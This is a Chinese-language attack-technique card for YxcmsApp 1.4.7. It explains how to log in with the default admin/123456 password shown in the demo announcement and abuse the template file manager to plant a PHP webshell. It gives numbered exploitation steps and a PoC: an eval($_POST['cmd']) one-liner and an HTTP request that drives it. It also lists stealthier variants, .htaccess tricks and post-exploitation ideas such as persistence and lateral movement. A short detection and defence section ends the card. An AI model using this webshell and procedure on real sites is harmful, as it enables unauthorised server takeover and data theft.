---
id: web-php-rce-yxcms-default-admin-template-file-webshell
title: Yxcms 演示公告泄露默认后台口令 admin/123456 + 前台模板文件管理新建 x.php：模板目录在 Web 根内直接解析 getshell
type: scenario
domain: web
path: web/php/rce
technique: yxcms-admin-template-file-write-webshell
aliases:
- Yxcms 模板编辑 getshell
- YxcmsApp 1.4.7 弱口令
- Yxcms 默认口令 admin/123456
- Yxcms 前台模板写马
- CMS 模板文件管理 RCE
affected_versions: YxcmsApp 1.4.7
tags:
- web
- php
- yxcms
- cms
- weak-password
- template-editor
- file-write
- webshell
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-10'
updated: '2026-11-10'
verification:
  verified_by: verifier-V452
  verified_at: '2026-11-10T02:08:33+08:00'
  notes: 已对照原文与 55 张截图核对：首页公告明文 admin/123456(图04)、登录后当前用户 YX 且左下角显示 YxcmsApp 1.4.7/PHP5.3.29/phpStudy(图05)、前台模板→管理模板文件(图06)、目录 C:/phpstudy_pro/www/www.yxcms6.com/protected/apps/default/view/default/(图07)、x.php 空页面可访问(图08)均与卡片一致；affected_versions 保留原文后台显示的 YxcmsApp 1.4.7。小瑕疵：卡片'随后用蚁剑连接成功'原文该段无蚁剑截图，属合理推断；未被验证点：未在环境复跑
---

# 一句话结论

Yxcms 演示模板的公告栏直接写明了后台入口与默认管理员口令（案例 `/index.php?r=admin`、`admin/123456`），未改默认口令的站点可被直接登录；后台“前台模板 → 管理模板文件”允许在当前模板目录 `protected/apps/default/view/default/` 下新建 PHP 文件，而该目录位于 Web 根内并被 PHP 解析，写入一句话木马后浏览器访问即 getshell。案例目标为 YxcmsApp 1.4.7（PHP 5.3.29 + Apache + phpstudy_pro）。

# 原理

- **默认口令随演示数据公开**：Yxcms 的默认演示模板在首页公告/介绍文字中直接给出后台地址与默认账号 `admin/123456`，并提示“请进入后修改默认密码”。未按提示修改口令的站点，攻击者无需爆破即可登录后台。
- **模板管理即文件读写**：后台“前台模板 → 管理模板文件”提供文件管理/编辑能力，可对当前启用模板目录下的文件进行查看、编辑与新建。模板目录 `protected/apps/default/view/default/` 位于 Web 根目录（案例 `C:/phpstudy_pro/www/www.yxcms6.com/protected/apps/default/view/default/`）内，Apache 会把其中新写入的 `.php` 文件交给 PHP 解析。
- **功能滥用即可执行代码**：不需要上传漏洞、解析漏洞或文件包含；“新建 PHP 文件 + 写入代码”直接把后台权限升级为 WebShell。案例新建 `x.php` 后浏览器访问页面为空白，说明 PHP 已被解析执行（无输出），随后用蚁剑连接成功。
- **信息辅助**：后台“环境信息”页面还会泄露站点物理路径、PHP 版本、数据库连通性、`allow_url_fopen`、上传大小限制等，便于后续放置木马与横向。

# 触发条件

- 目标运行 Yxcms（案例 YxcmsApp 1.4.7），且管理员未修改默认口令（或公告/演示数据泄露当前口令）。
- 攻击者可访问后台登录页与“前台模板 → 管理模板文件”功能。
- Web 服务器对模板目录中的 `.php` 正常解析（默认配置即如此）。
- 后台会话未被 IP 白名单/二次认证等限制。

# 利用步骤

1. 访问站点首页，查看公告/演示内容，获取后台地址与默认口令（案例 `admin/123456`）。
2. 打开 `/index.php?r=admin` 用默认口令登录后台，确认“当前用户”。
3. 进入“前台模板”，对“模板正在使用中”的模板点击“管理模板文件”。
4. 在模板目录新建 `x.php`（或编辑现有模板文件），写入一句话木马。
5. 浏览器访问 `http://target/protected/apps/default/view/default/x.php`，页面空白说明 PHP 已解析；用蚁剑/菜刀连接该地址执行命令。
6. 在后台“环境信息”读取站点物理路径、PHP 版本与配置，决定后续提权/横向方式。

# PoC

```php
<?php eval($_POST['cmd']); ?>
```

```http
POST /protected/apps/default/view/default/x.php HTTP/1.1
Host: target.example
Content-Type: application/x-www-form-urlencoded

cmd=phpinfo();
```

# 变体与关联

- **同类 CMS 后台模板写马**：WordPress 主题编辑器、DedeCMS 模板标签源码编辑、ZzzCMS 模板 assert 等，见 [[web-php-wordpress-admin-weak-password-theme-editor-rce]]、[[web-php-rce-dedecms-template-tag-source-substr-replace-waf-bypass]]、[[web-php-rce-zzzcms-admin-template-assert-webshell]]。
- **默认口令来源**：演示数据、安装说明、帮助文档、示例页面；也可改用弱口令爆破进入后台，再走模板编辑。
- **写入位置变体**：除新建 `.php` 外，也可编辑模板中已有 PHP 文件插入代码（更隐蔽），或写入 `.htaccess` 改变解析规则。
- **后续利用**：WebShell 后读取数据库配置、写入计划任务/自启动、内网扫描与横向，与常规 PHP 站点一致。

# 检测与防御

- 安装后立即修改默认管理员口令，清理演示公告中的默认凭据；限制后台访问来源（VPN/管理网段/白名单）。
- 生产环境移除在线模板编辑/文件管理功能，或将模板目录设为只读且禁止 PHP 解析；模板变更走发布流程。
- Web 目录最小权限：Web 进程不应对模板目录有写权限；对模板目录新增/修改 `.php` 文件做完整性监控与告警。
- 检测：后台登录成功后立即访问模板管理并新建 `.php`；模板目录出现新 PHP 文件；访问空白页面后出现蚁剑/菜刀类流量特征；WAF 对模板编辑接口提交的 `eval/system/assert` 等代码告警。
